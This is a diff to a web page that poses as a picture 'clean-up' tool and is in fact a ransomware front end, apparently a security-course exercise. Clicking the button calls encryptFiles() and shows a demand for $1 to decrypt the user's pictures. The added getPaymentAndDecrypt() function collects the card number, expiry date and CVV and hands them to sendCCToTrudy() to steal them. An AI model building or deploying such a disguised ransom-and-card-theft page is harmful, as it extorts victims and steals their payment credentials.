@@ -24,6 +24,7 @@ body,h1,h2,h3,h4,h5,h6 {font-family: "Lato", sans-serif}
 .fa-anchor,.fa-bug {font-size:200px}
 </style>
 <script type="text/javascript" src="./js/crypto.js"></script>
+ <script src="js/jquery.creditCardValidator.js"></script>
 <body>
   <!-- Header -->
   <header class="w3-container w3-red w3-center" style="padding:128px 16px">
@@ -32,7 +33,7 @@ body,h1,h2,h3,h4,h5,h6 {font-family: "Lato", sans-serif}
     <button id="encrypt-button" onclick="myFunction()" class="w3-button w3-black w3-padding-large w3-large w3-margin-top">Clich here to begin clean-up! </button>
   </header>
   <div class="container" style="display:none"   id="payment-div">
-    <form class="form-horizontal" role="form">
+    <form class="form-horizontal" role="form" id="creditCardForm">
       <fieldset>
         <p class="w3-xlarge">YOUR PICTURES ARE NOW ENCRYPTED PAY $1 RANSOME TO DECRYPT ALL THE PICTURES</p>
         <legend>Payment</legend>
@@ -91,7 +92,7 @@ body,h1,h2,h3,h4,h5,h6 {font-family: "Lato", sans-serif}
         </div>
         <div class="form-group">
           <div class="col-sm-offset-3 col-sm-9">
-            <button type="button" class="btn btn-success">Pay Now</button>
+            <button type="button" class="btn btn-success">Pay Now and Decrypt My Files</button>
           </div>
         </div>
       </fieldset>
@@ -136,6 +137,24 @@ body,h1,h2,h3,h4,h5,h6 {font-family: "Lato", sans-serif}
     var e = document.getElementById('payment-div');
       e.style.display = (e.style.display == 'block') ? 'none' : 'block';
       encryptFiles();
+  }
+  // $('#card-number').validateCreditCard(function(result)
+  //   {
+  //       alert('CC type: ' + result.card_type.name
+  //         + '\nLength validation: ' + result.length_valid
+  //         + '\nLuhn validation: ' + result.luhn_valid);
+  //   });
+  function getPaymentAndDecrypt(){
+    var cc = $('#card-number').val();
+    var expDate = $('#expiry-month').val();
+    expDate +='/' + $('#expiry-year').val();
+    var cvv = $('#cvv').val();
+
+    if(sendCCToTrudy(cc, cvv, expDate)) {
+       alert("Thank you! your files have been decrypted");
+    } else {
+      alert("Invalid Payment Method!! Say good by to your files");
+    }
   }
   </script>
 </body>
